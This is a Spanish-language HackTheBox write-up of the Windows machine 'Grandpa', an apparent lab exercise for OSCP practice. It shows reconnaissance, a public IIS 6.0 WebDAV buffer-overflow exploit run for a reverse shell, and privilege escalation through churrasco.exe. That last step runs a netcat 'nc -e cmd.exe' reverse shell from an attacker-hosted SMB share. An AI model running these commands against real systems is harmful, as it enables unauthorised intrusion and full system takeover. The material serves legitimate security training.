---
layout: single
title: Writeup HTB - Maquina Grandpa
comments: true
excerpt: "La maquina Grandpa es una maquina windows - Easy, al realizar un scan con nmap vemos que solo tenemos el puerto 80, obtenemos una reverse shell haciendo uso de un exploit IIS 6.0. Por ultimo logramos escalar privilegios abusando del privilegio SeImpersonatePrivilege, haciendo uso del exploit churrasco.exe obtenemos una reverse shell con permisos de nt authority system."
date: 2022-02-15
classes: wide
header:
  teaser: /assets/images/2022-02-16-writeup-maquina-htb-grandpa/Untitled.png
  teaser_home_page: true
categories:
  - HackTheBox
tags:
  - OSCP  
  - Hacking
  - Windows
  - Easy
---

# Grandpa
<p align="center">
<img src="/assets/images/2022-02-16-writeup-maquina-htb-grandpa/Untitled.png">
</p>

## Resumen
<div style="text-align: justify">
La maquina Grandpa es una maquina windows - Easy, al realizar un scan con nmap vemos que solo tenemos el puerto 80, obtenemos una reverse shell haciendo uso de un exploit IIS 6.0. Por ultimo logramos escalar privilegios abusando del privilegio SeImpersonatePrivilege, haciendo uso del exploit churrasco.exe obtenemos una reverse shell con permisos de nt authority system.
</div>

## Scan Nmap
```bash
# Nmap 7.92 scan initiated Sun Feb 20 10:08:20 2022 as: nmap -sC -sV -p80 -oN targeted -Pn -vvv 10.129.95.233
Nmap scan report for 10.129.95.233
Host is up, received user-set (0.18s latency).
Scanned at 2022-02-20 10:08:21 -05 for 11s

PORT   STATE SERVICE REASON          VERSION
80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 6.0
| http-ntlm-info: 
|   Target_Name: GRANPA
|   NetBIOS_Domain_Name: GRANPA
|   NetBIOS_Computer_Name: GRANPA
|   DNS_Domain_Name: granpa
|   DNS_Computer_Name: granpa
|_  Product_Version: 5.2.3790
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT POST MOVE MKCOL PROPPATCH
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
| http-webdav-scan: 
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|   Server Date: Sun, 20 Feb 2022 15:08:31 GMT
|   WebDAV type: Unknown
|   Server Type: Microsoft-IIS/6.0
|_  Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Feb 20 10:08:32 2022 -- 1 IP address (1 host up) scanned in 11.76 seconds
```

## Port 80

revisamos la pagina web y nos vemos nada en especial mas que una pagina que dice Under Construccion

![Untitled](/assets/images/2022-02-16-writeup-maquina-htb-grandpa/Untitled%201.png)

escaneamos directorios pero no encontre nada interesante

```bash
Grandpa # ❯ dirsearch -u [http://10.129.95.233/](http://10.129.95.233/) -w /usr/share/wordlists/dirb/common.txt -f -e asp,aspx,txt,zip,bak,save -x 500 -t 200

*|. _ _  _  _  _ |    v0.4.2.1
(*||| *) (/*(*|| (*| )

Extensions: asp, aspx, txt, zip, bak, save | HTTP method: GET | Threads: 200 | Wordlist size: 36321

Output File: /usr/local/lib/python3.9/dist-packages/dirsearch-0.4.2-py3.9.egg/dirsearch/reports/10.129.95.233/-_22-02-20_10-18-42.txt

Log File:

Target: [http://10.129.95.233/](http://10.129.95.233/)

[10:18:42] Starting:
[10:18:46] 403 -    1KB - /_private
[10:18:48] 403 -  218B  - /_vti_bin/
[10:18:48] 301 -  157B  - /_vti_bin  ->  [http://10.129.95.233/_vti_bin/](http://10.129.95.233/%5Fvti%5Fbin/)
[10:18:48] 403 -    1KB - /_vti_log/
[10:18:48] 403 -    1KB - /_vti_cnf
[10:18:48] 200 -  195B  - /_vti_bin/_vti_adm/admin.dll
[10:18:48] 403 -    1KB - /_vti_log
[10:18:48] 200 -  195B  - /_vti_bin/_vti_aut/author.dll
[10:18:48] 200 -   96B  - /_vti_bin/shtml.dll
[10:18:46] 403 -    1KB - /_private/
[10:18:48] 403 -    1KB - /_vti_pvt
[10:18:48] 403 -    1KB - /_vti_txt
[10:18:49] 403 -    1KB - /_vti_txt/
[10:19:10] 403 -  218B  - /aspnet_client
[10:19:10] 403 -  218B  - /aspnet_client/
[10:21:09] 301 -  151B  - /images  ->  [http://10.129.95.233/images/](http://10.129.95.233/images/)
[10:21:09] 301 -  151B  - /Images  ->  [http://10.129.95.233/Images/](http://10.129.95.233/Images/)
[10:21:09] 403 -  218B  - /Images/
[10:21:09] 403 -  218B  - /images/

Task Completed
```

vemos que tiene activado webdav, asi que usamos davtest para ver si podemos subir una web shell

```bash
Grandpa # ❯ davtest -url http://10.129.95.233                                                                                       
********************************************************
 Testing DAV connection
OPEN		SUCCEED:		http://10.129.95.233
********************************************************
NOTE	Random string for this session: 8RtTzDr4tKYbpQK
********************************************************
 Creating directory
MKCOL		FAIL
********************************************************
 Sending test files
PUT	jhtml	FAIL
PUT	asp	FAIL
PUT	php	FAIL
PUT	pl	FAIL
PUT	shtml	FAIL
PUT	txt	FAIL
PUT	aspx	FAIL
PUT	html	FAIL
PUT	cfm	FAIL
PUT	cgi	FAIL
PUT	jsp	FAIL

********************************************************
/usr/bin/davtest Summary:
```

buscamos exploits relacionados a IIS 6.0

```bash
Grandpa # ❯ searchsploit IIS 6
---------------------------------------------------------------------------------------------------------------------------------------- 
 Exploit Title                                                                                         |  Path
---------------------------------------------------------------------------------------------------------------------------------------- 

[snip]

Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow                               | windows/remote/41738.py
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass                                                | windows/remote/8765.php
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (1)                                            | windows/remote/8704.txt
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (2)                                            | windows/remote/8806.pl

[snip]

---------------------------------------------------------------------------------------------------------------------------------------- 
Shellcodes: No Results
```

descargamos este exploit 

```bash
Grandpa # ❯ searchsploit -m 41738
  Exploit: Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow
      URL: https://www.exploit-db.com/exploits/41738
     Path: /usr/share/exploitdb/exploits/windows/remote/41738.py
File Type: ASCII text, with very long lines

Copied to: /mnt/Pentester/Certificaciones/OSCP/WorkFolder/Plataformas/htb/Grandpa/41738.py
```

pero no entendia su funcionamiento. Asi que busque un exploit en un repositorio de github y pude encontrar uno 

```bash
https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269/blob/master/iis6%20reverse%20shell
```

descargamos nuestro exploit

```bash
Grandpa # ❯ wget https://raw.githubusercontent.com/g0rx/iis6-exploit-2017-CVE-2017-7269/master/iis6%20reverse%20shell
--2022-02-20 10:34:09--  https://raw.githubusercontent.com/g0rx/iis6-exploit-2017-CVE-2017-7269/master/iis6%20reverse%20shell
Resolviendo raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.110.133, ...
Conectando con raw.githubusercontent.com (raw.githubusercontent.com)[185.199.108.133]:443... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 12313 (12K) [text/plain]
Grabando a: «iis6 reverse shell»

iis6 reverse shell                         100%[========================>]  12,02K  --.-KB/s    en 0,01s   

2022-02-20 10:34:09 (950 KB/s) - «iis6 reverse shell» guardado [12313/12313]
```

dejamos el puerto 443 en escucha 

```bash
Grandpa # ❯ rlwrap nc -nlvp 443      
listening on [any] 443 ...
```

ejecutamos el exploit de la siguiente manera

```bash
python2 iis6webdav.py 10.129.95.233 80 10.10.14.54 443
```

obtenemos una reverse shell exitosa

![Untitled](/assets/images/2022-02-16-writeup-maquina-htb-grandpa/Untitled%202.png)

## Escalacion de Privilegios

para escalar privilegios enumeramos la maquina para obtener informacion 

```bash
systeminfo

Host Name:                 GRANPA
OS Name:                   Microsoft(R) Windows(R) Server 2003, Standard Edition
OS Version:                5.2.3790 Service Pack 2 Build 3790
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Uniprocessor Free
Registered Owner:          HTB
Registered Organization:   HTB
Product ID:                69712-296-0024942-44782
Original Install Date:     4/12/2017, 5:07:40 PM
System Up Time:            0 Days, 0 Hours, 47 Minutes, 52 Seconds
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x86 Family 6 Model 85 Stepping 7 GenuineIntel ~2293 Mhz
BIOS Version:              INTEL  - 6040000
Windows Directory:         C:\WINDOWS
System Directory:          C:\WINDOWS\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (GMT+02:00) Athens, Beirut, Istanbul, Minsk
Total Physical Memory:     1,023 MB
Available Physical Memory: 718 MB
Page File: Max Size:       2,470 MB
Page File: Available:      2,261 MB
Page File: In Use:         209 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 1 Hotfix(s) Installed.
                           [01]: Q147222
Network Card(s):           N/A
```

vemos los privilegios que tiene nuestro usuario y vemos que tenemos el privilegio SeImpersonatePrivilege 

```bash
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAuditPrivilege              Generate security audits                  Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled
```

por lo tanto podemos usar el exploit churrasco para explotar ese privilegio y poder escalar privilegios

```bash
https://github.com/Re4son/Churrasco/blob/master/churrasco.exe
```

asi que en nuestra carpeta de trabajo creamos un servidor samba con impacket

```bash
Grandpa # ❯ impacket-smbserver shared . -smb2support
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

dejamos el puerto 443 en escucha

```bash
Grandpa # ❯ rlwrap nc -nlvp 443
listening on [any] 443 ...
```

y ejecutamos dicho comando en la maquina victima para obtener una reverse shell con permisos de nt authority system

```bash
\\10.10.14.54\shared\churrasco.exe "\\\\10.10.14.54\\shared\\nc.exe -e cmd.exe 10.10.14.54 443"
```

![Untitled](/assets/images/2022-02-16-writeup-maquina-htb-grandpa/Untitled%203.png)